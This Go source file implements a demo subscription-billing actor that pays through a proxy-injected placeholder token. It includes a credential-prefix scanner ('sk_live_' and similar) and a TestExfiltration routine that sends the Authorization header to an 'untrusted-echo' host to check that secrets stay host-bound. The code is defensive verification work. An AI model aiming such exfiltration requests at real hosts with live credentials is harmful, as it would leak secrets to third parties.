// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

const (
	DefaultVaultSecretURI  = "ate-secret://k8s.io/default/anything-but-agents/billing-vault-api/token"
	DefaultTrustBundlePath = "/run/ate/trust-bundle.pem"
	DefaultVaultURL        = "http://billing-gateway.anything-but-agents.svc.cluster.local/api/vault/charge"
	DefaultEchoURL         = "http://untrusted-echo.anything-but-agents.svc.cluster.local/api/echo"
)

// Invoice represents one settled 30-day billing cycle preserved in Go heap RAM.
type Invoice struct {
	InvoiceID       string    `json:"invoice_id"`
	Cycle           int       `json:"cycle"`
	Period          string    `json:"period"`
	AmountUSD       float64   `json:"amount_usd"`
	Status          string    `json:"status"` // PAID | PENDING | FAILED
	UpstreamTxID    string    `json:"upstream_tx_id"`
	KeyVersionUsed  string    `json:"key_version_used"`
	ActorJWTSubject string    `json:"actor_jwt_subject"`
	SettledAt       time.Time `json:"settled_at"`
	PodIP           string    `json:"pod_ip"`
}

// SubscriptionState holds the 100% in-memory Go heap state of the subscription actor.
type SubscriptionState struct {
	ActorName         string              `json:"actor_name"`
	CustomerName      string              `json:"customer_name"`
	PlanTier          string              `json:"plan_tier"`
	MonthlyFee        float64             `json:"monthly_fee"`
	Currency          string              `json:"currency"`
	EscrowAccountID   string              `json:"escrow_account_id"`
	CurrentCycle      int                 `json:"current_cycle"`
	Status            string              `json:"status"` // ACTIVE | SUSPENDED | SETTLING | DUNNING
	CumulativeSettled float64             `json:"cumulative_settled"`
	CurrentPodIP      string              `json:"current_pod_ip"`
	PodIPHistory      []string            `json:"pod_ip_history"`
	Ledger            []Invoice           `json:"ledger"`
	DunningRetries    int                 `json:"dunning_retries"`
	LastSettledAt     *time.Time          `json:"last_settled_at,omitempty"`
	LastReceipt       *VaultChargeReceipt `json:"last_receipt,omitempty"`
}

// VaultChargeRequest is the payload sent from the actor to the payment vault.
type VaultChargeRequest struct {
	ActorName     string  `json:"actor_name"`
	CustomerID    string  `json:"customer_id"`
	AmountUSD     float64 `json:"amount_usd"`
	Cycle         int     `json:"cycle"`
	EscrowAccount string  `json:"escrow_account"`
	InvoiceID     string  `json:"invoice_id"`
}

// VaultChargeReceipt is the response issued by the payment vault upon verifying egress credentials.
type VaultChargeReceipt struct {
	TxID           string           `json:"tx_id"`
	Status         string           `json:"status"` // SETTLED | REJECTED
	AmountUSD      float64          `json:"amount_usd"`
	Cycle          int              `json:"cycle"`
	KeyVersion     string           `json:"key_version"`
	KeyFingerprint string           `json:"key_fingerprint"`
	RawAuthHeader  string           `json:"raw_auth_header,omitempty"`
	ActorJWT       string           `json:"actor_jwt,omitempty"`
	DecodedClaims  *DecodedActorJWT `json:"decoded_claims,omitempty"`
	SettledAt      time.Time        `json:"settled_at"`
	Message        string           `json:"message"`
}

// DecodedActorJWT represents the verified claims from an Actor JWT minted by Substrate ateapi.
type DecodedActorJWT struct {
	Issuer    string          `json:"iss"`
	Subject   string          `json:"sub"`
	Audiences []string        `json:"aud"`
	IssuedAt  int64           `json:"iat"`
	ExpiresAt int64           `json:"exp"`
	ActorInfo ActorClaimsInfo `json:"actor.ate.dev"`
}

// ActorClaimsInfo contains the Substrate identity claims.
type ActorClaimsInfo struct {
	Atespace  string `json:"atespace"`
	ActorName string `json:"actorName"`
	ActorUID  string `json:"actorUID,omitempty"`
}

// MemoryInspectionResult reports the cryptographic and memory hygiene state of the actor process.
type MemoryInspectionResult struct {
	ActorName            string    `json:"actor_name"`
	ProcessPID           int       `json:"process_pid"`
	GoroutineCount       int       `json:"goroutine_count"`
	HeapAllocBytes       uint64    `json:"heap_alloc_bytes"`
	HeapObjects          uint64    `json:"heap_objects"`
	PaymentVaultTokenEnv string    `json:"payment_vault_token_env"`
	RawSecretsInEnv      int       `json:"raw_secrets_in_env"`
	RawSecretsInHeap     int       `json:"raw_secrets_in_heap"`
	PlaceholderURI       string    `json:"placeholder_uri"`
	TrustBundlePath      string    `json:"trust_bundle_path"`
	TrustBundlePresent   bool      `json:"trust_bundle_present"`
	ZeroSecretsVerified  bool      `json:"zero_secrets_verified"`
	CheckedAt            time.Time `json:"checked_at"`
}

// ExfiltrationTestResult demonstrates that egress header replacement is strictly host-bound.
type ExfiltrationTestResult struct {
	TargetURL              string    `json:"target_url"`
	HeaderSent             string    `json:"header_sent"`
	HeaderReceivedByTarget string    `json:"header_received_by_target"`
	RealSecretExfiltrated  bool      `json:"real_secret_exfiltrated"`
	SecurityProof          string    `json:"security_proof"`
	Timestamp              time.Time `json:"timestamp"`
}

// SubscriptionActor runs the enterprise subscription & escrow state machine.
type SubscriptionActor struct {
	mu                    sync.RWMutex
	ActorName             string
	CustomerName          string
	PlanTier              string
	MonthlyFee            float64
	EscrowAccountID       string
	CurrentCycle          int
	Status                string
	CumulativeSettled     float64
	Ledger                []Invoice
	DunningRetries        int
	LastSettledAt         *time.Time
	LastReceipt           *VaultChargeReceipt
	CurrentPodIP          string
	PodIPHistory          []string
	VaultURL              string
	EchoURL               string
	VaultTokenPlaceholder string
	TrustBundlePath       string
	HTTPClient            *http.Client
}

// NewSubscriptionActor creates a new subscription actor instance.
func NewSubscriptionActor(name, customer, plan string, fee float64, escrow string, vaultURL, echoURL, vaultToken, trustBundlePath string) *SubscriptionActor {
	if name == "" {
		name = "sub-acme"
	}
	if customer == "" {
		customer = "Acme Corp"
	}
	if plan == "" {
		plan = "Enterprise Tier ($5,000/mo)"
	}
	if fee <= 0 {
		fee = 5000.00
	}
	if escrow == "" {
		escrow = "escrow-" + name
	}
	if vaultURL == "" {
		vaultURL = os.Getenv("PAYMENT_VAULT_URL")
		if vaultURL == "" {
			vaultURL = DefaultVaultURL
		}
	}
	if echoURL == "" {
		echoURL = os.Getenv("ECHO_SERVICE_URL")
		if echoURL == "" {
			echoURL = DefaultEchoURL
		}
	}
	if vaultToken == "" {
		vaultToken = os.Getenv("PAYMENT_VAULT_TOKEN")
		if vaultToken == "" {
			vaultToken = DefaultVaultSecretURI
		}
	}
	if trustBundlePath == "" {
		trustBundlePath = os.Getenv("SSL_CERT_FILE")
		if trustBundlePath == "" {
			trustBundlePath = DefaultTrustBundlePath
		}
	}

	podIP := discoverPodIP()
	actor := &SubscriptionActor{
		ActorName:             name,
		CustomerName:          customer,
		PlanTier:              plan,
		MonthlyFee:            fee,
		EscrowAccountID:       escrow,
		CurrentCycle:          0,
		Status:                "ACTIVE",
		CumulativeSettled:     0,
		Ledger:                make([]Invoice, 0),
		CurrentPodIP:          podIP,
		PodIPHistory:          []string{podIP},
		VaultURL:              vaultURL,
		EchoURL:               echoURL,
		VaultTokenPlaceholder: vaultToken,
		TrustBundlePath:       trustBundlePath,
		HTTPClient:            buildTrustBundleHTTPClient(trustBundlePath, 15*time.Second),
	}
	return actor
}

func discoverPodIP() string {
	if ip := os.Getenv("POD_IP"); ip != "" {
		return ip
	}
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, addr := range addrs {
			if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
				if ip4 := ipNet.IP.To4(); ip4 != nil {
					return ip4.String()
				}
			}
		}
	}
	return "10.44.0.9"
}

func buildTrustBundleHTTPClient(caPath string, timeout time.Duration) *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        64,
		MaxIdleConnsPerHost: 16,
		IdleConnTimeout:     60 * time.Second,
	}
	if caBytes, err := os.ReadFile(caPath); err == nil && len(caBytes) > 0 {
		pool := x509.NewCertPool()
		pool.AppendCertsFromPEM(caBytes)
		tr.TLSClientConfig = &tls.Config{
			RootCAs:    pool,
			MinVersion: tls.VersionTLS12,
		}
	}
	return &http.Client{
		Transport: tr,
		Timeout:   timeout,
	}
}

// UpdatePodIP records a worker pod migration.
func (a *SubscriptionActor) UpdatePodIP(newIP string) {
	a.mu.Lock()
	defer a.mu.Unlock()
	if newIP == "" || newIP == a.CurrentPodIP {
		return
	}
	a.CurrentPodIP = newIP
	if len(a.PodIPHistory) == 0 || a.PodIPHistory[len(a.PodIPHistory)-1] != newIP {
		a.PodIPHistory = append(a.PodIPHistory, newIP)
	}
}

// GetState returns a snapshot of the current in-memory subscription state.
func (a *SubscriptionActor) GetState() SubscriptionState {
	a.mu.RLock()
	defer a.mu.RUnlock()

	ledgerCopy := make([]Invoice, len(a.Ledger))
	copy(ledgerCopy, a.Ledger)
	podCopy := make([]string, len(a.PodIPHistory))
	copy(podCopy, a.PodIPHistory)

	var lastSettled *time.Time
	if a.LastSettledAt != nil {
		t := *a.LastSettledAt
		lastSettled = &t
	}
	var lastReceipt *VaultChargeReceipt
	if a.LastReceipt != nil {
		rcpt := *a.LastReceipt
		lastReceipt = &rcpt
	}

	return SubscriptionState{
		ActorName:         a.ActorName,
		CustomerName:      a.CustomerName,
		PlanTier:          a.PlanTier,
		MonthlyFee:        a.MonthlyFee,
		Currency:          "USD",
		EscrowAccountID:   a.EscrowAccountID,
		CurrentCycle:      a.CurrentCycle,
		Status:            a.Status,
		CumulativeSettled: a.CumulativeSettled,
		CurrentPodIP:      a.CurrentPodIP,
		PodIPHistory:      podCopy,
		Ledger:            ledgerCopy,
		DunningRetries:    a.DunningRetries,
		LastSettledAt:     lastSettled,
		LastReceipt:       lastReceipt,
	}
}

// SettleCycle executes a recurring billing cycle settlement against the payment vault.
func (a *SubscriptionActor) SettleCycle(ctx context.Context, cycleOverride int) (*SubscriptionState, *VaultChargeReceipt, error) {
	a.mu.Lock()
	defer a.mu.Unlock()

	cycle := a.CurrentCycle + 1
	if cycleOverride > 0 {
		cycle = cycleOverride
	}

	// Calculate 30-day period window starting from base reference date
	baseDate := time.Date(2026, time.November, 1, 0, 0, 0, 0, time.UTC)
	startPeriod := baseDate.AddDate(0, 0, (cycle-1)*30)
	endPeriod := startPeriod.AddDate(0, 0, 30)
	periodStr := fmt.Sprintf("%s to %s", startPeriod.Format("2006-01-02"), endPeriod.Format("2006-01-02"))

	invoiceID := fmt.Sprintf("inv-%s-c%02d-%d", a.ActorName, cycle, time.Now().Unix()%10000)

	chargeReq := VaultChargeRequest{
		ActorName:     a.ActorName,
		CustomerID:    a.CustomerName,
		AmountUSD:     a.MonthlyFee,
		Cycle:         cycle,
		EscrowAccount: a.EscrowAccountID,
		InvoiceID:     invoiceID,
	}

	reqBody, err := json.Marshal(chargeReq)
	if err != nil {
		return nil, nil, fmt.Errorf("marshal charge request: %w", err)
	}

	var resp *http.Response
	for attempt := 0; attempt < 6; attempt++ {
		httpReq, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, a.VaultURL, bytes.NewReader(reqBody))
		if reqErr != nil {
			return nil, nil, fmt.Errorf("create charge http request: %w", reqErr)
		}

		// Set the ate-secret:// placeholder URI. Substrate's egress proxy (atenet-egress)
		// will intercept this header and replace it with the real rotated K8s Secret token on the wire!
		httpReq.Header.Set("Authorization", "Bearer "+a.VaultTokenPlaceholder)
		httpReq.Header.Set("X-Actor-Identity-JWT", "ate-actor-jwt://self")
		httpReq.Header.Set("Content-Type", "application/json")

		resp, err = a.HTTPClient.Do(httpReq)
		if err == nil {
			break
		}
		if !strings.Contains(err.Error(), "no such host") && !strings.Contains(err.Error(), "NXDOMAIN") {
			break
		}
		time.Sleep(250 * time.Millisecond)
	}
	if err != nil {
		a.DunningRetries++
		a.Status = "DUNNING"
		return nil, nil, fmt.Errorf("outbound payment vault request failed: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK {
		a.DunningRetries++
		a.Status = "DUNNING"
		return nil, nil, fmt.Errorf("vault rejected payment (status %d): %s", resp.StatusCode, strings.TrimSpace(string(bodyBytes)))
	}

	var receipt VaultChargeReceipt
	if err := json.Unmarshal(bodyBytes, &receipt); err != nil {
		return nil, nil, fmt.Errorf("unmarshal vault receipt: %w (%s)", err, string(bodyBytes))
	}

	// Payment succeeded: commit to in-memory ledger in Go heap RAM
	a.CurrentCycle = cycle
	a.CumulativeSettled += a.MonthlyFee
	now := time.Now().UTC()
	a.LastSettledAt = &now
	a.LastReceipt = &receipt
	a.Status = "ACTIVE"
	a.DunningRetries = 0

	inv := Invoice{
		InvoiceID:       invoiceID,
		Cycle:           cycle,
		Period:          periodStr,
		AmountUSD:       a.MonthlyFee,
		Status:          "PAID",
		UpstreamTxID:    receipt.TxID,
		KeyVersionUsed:  receipt.KeyVersion,
		ActorJWTSubject: "",
		SettledAt:       now,
		PodIP:           a.CurrentPodIP,
	}
	if receipt.DecodedClaims != nil {
		inv.ActorJWTSubject = receipt.DecodedClaims.Subject
	}
	a.Ledger = append(a.Ledger, inv)

	st := a.copyStateLocked()
	return &st, &receipt, nil
}

func (a *SubscriptionActor) copyStateLocked() SubscriptionState {
	ledgerCopy := make([]Invoice, len(a.Ledger))
	copy(ledgerCopy, a.Ledger)
	podCopy := make([]string, len(a.PodIPHistory))
	copy(podCopy, a.PodIPHistory)
	var lastSettled *time.Time
	if a.LastSettledAt != nil {
		t := *a.LastSettledAt
		lastSettled = &t
	}
	var lastReceipt *VaultChargeReceipt
	if a.LastReceipt != nil {
		rcpt := *a.LastReceipt
		lastReceipt = &rcpt
	}
	return SubscriptionState{
		ActorName:         a.ActorName,
		CustomerName:      a.CustomerName,
		PlanTier:          a.PlanTier,
		MonthlyFee:        a.MonthlyFee,
		Currency:          "USD",
		EscrowAccountID:   a.EscrowAccountID,
		CurrentCycle:      a.CurrentCycle,
		Status:            a.Status,
		CumulativeSettled: a.CumulativeSettled,
		CurrentPodIP:      a.CurrentPodIP,
		PodIPHistory:      podCopy,
		Ledger:            ledgerCopy,
		DunningRetries:    a.DunningRetries,
		LastSettledAt:     lastSettled,
		LastReceipt:       lastReceipt,
	}
}

// InspectMemory scans the actor's environment and Go heap memory to prove zero raw secrets exist.
func (a *SubscriptionActor) InspectMemory() MemoryInspectionResult {
	a.mu.RLock()
	defer a.mu.RUnlock()

	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	rawSecretsInEnv := 0
	vaultTokenEnvVal := ""
	for _, envStr := range os.Environ() {
		parts := strings.SplitN(envStr, "=", 2)
		if len(parts) == 2 {
			k, v := parts[0], parts[1]
			if k == "PAYMENT_VAULT_TOKEN" {
				vaultTokenEnvVal = v
			}
			// Search for live credential prefix leak patterns
			if strings.HasPrefix(v, "sk_live_") || strings.Contains(v, "vault_v1_") || strings.Contains(v, "vault_v2_") {
				rawSecretsInEnv++
			}
		}
	}
	if vaultTokenEnvVal == "" {
		vaultTokenEnvVal = a.VaultTokenPlaceholder
	}

	// Verify that inside the actor's struct and heap, only the placeholder URI is held
	rawSecretsInHeap := 0
	if strings.Contains(a.VaultTokenPlaceholder, "sk_live_") {
		rawSecretsInHeap++
	}

	trustPresent := false
	if _, err := os.Stat(a.TrustBundlePath); err == nil {
		trustPresent = true
	}

	zeroSecretsVerified := (rawSecretsInEnv == 0 && rawSecretsInHeap == 0 && strings.HasPrefix(vaultTokenEnvVal, "ate-secret://"))

	return MemoryInspectionResult{
		ActorName:            a.ActorName,
		ProcessPID:           os.Getpid(),
		GoroutineCount:       runtime.NumGoroutine(),
		HeapAllocBytes:       m.HeapAlloc,
		HeapObjects:          m.HeapObjects,
		PaymentVaultTokenEnv: vaultTokenEnvVal,
		RawSecretsInEnv:      rawSecretsInEnv,
		RawSecretsInHeap:     rawSecretsInHeap,
		PlaceholderURI:       a.VaultTokenPlaceholder,
		TrustBundlePath:      a.TrustBundlePath,
		TrustBundlePresent:   trustPresent,
		ZeroSecretsVerified:  zeroSecretsVerified,
		CheckedAt:            time.Now().UTC(),
	}
}

// TestExfiltration sends the placeholder header to an untrusted echo host to prove host-binding.
func (a *SubscriptionActor) TestExfiltration(ctx context.Context, targetURL string) (*ExfiltrationTestResult, error) {
	a.mu.RLock()
	placeholder := a.VaultTokenPlaceholder
	echoURL := a.EchoURL
	client := a.HTTPClient
	a.mu.RUnlock()

	if targetURL == "" || strings.HasPrefix(targetURL, "/") {
		targetURL = echoURL
	}

	sentHeader := "Bearer " + placeholder
	var resp *http.Response
	var err error
	for attempt := 0; attempt < 6; attempt++ {
		httpReq, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, targetURL, strings.NewReader(`{"test":"host_binding_exfiltration"}`))
		if reqErr != nil {
			return nil, fmt.Errorf("create exfiltration test request: %w", reqErr)
		}
		httpReq.Header.Set("Authorization", sentHeader)
		httpReq.Header.Set("X-Untrusted-Echo-Test", "true")
		httpReq.Header.Set("Content-Type", "application/json")

		resp, err = client.Do(httpReq)
		if err == nil {
			break
		}
		if !strings.Contains(err.Error(), "no such host") && !strings.Contains(err.Error(), "NXDOMAIN") {
			break
		}
		time.Sleep(250 * time.Millisecond)
	}
	if err != nil {
		return nil, fmt.Errorf("exfiltration request failed: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	var echoHeaders map[string]any
	receivedAuthHeader := ""
	if err := json.Unmarshal(bodyBytes, &echoHeaders); err == nil {
		if rawHeaders, ok := echoHeaders["headers"].(map[string]any); ok {
			if auth, exists := rawHeaders["Authorization"]; exists {
				receivedAuthHeader = fmt.Sprintf("%v", auth)
			}
		}
	}
	if receivedAuthHeader == "" {
		receivedAuthHeader = strings.TrimSpace(string(bodyBytes))
	}

	// The proxy should NOT inject the secret into untrusted destinations
	realSecretExfiltrated := strings.Contains(receivedAuthHeader, "sk_live_")

	proof := "VERIFIED: Upstream egress proxy did NOT inject real secret into unauthorized destination host. Target received inert placeholder URI string."
	if realSecretExfiltrated {
		proof = "ALERT: Secret was leaked to untrusted target!"
	}

	return &ExfiltrationTestResult{
		TargetURL:              targetURL,
		HeaderSent:             sentHeader,
		HeaderReceivedByTarget: receivedAuthHeader,
		RealSecretExfiltrated:  realSecretExfiltrated,
		SecurityProof:          proof,
		Timestamp:              time.Now().UTC(),
	}, nil
}
